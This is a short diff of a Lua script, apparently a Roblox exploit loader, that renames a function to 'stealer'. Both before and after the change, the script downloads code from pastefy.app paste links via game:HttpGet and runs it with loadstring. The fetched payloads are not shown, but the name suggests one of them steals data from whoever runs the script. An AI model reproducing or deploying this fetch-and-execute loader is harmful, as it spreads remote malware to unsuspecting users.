@@ -1,8 +1,8 @@
-local function script()
+local function stealer()
    loadstring(game:HttpGet("https://pastefy.app/5mqaW019/raw"))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://pastefy.app/NbPeWeNX"))()
 end
-task.spawn(script)
+task.spawn(stealer)
 task.spawn(loadui)
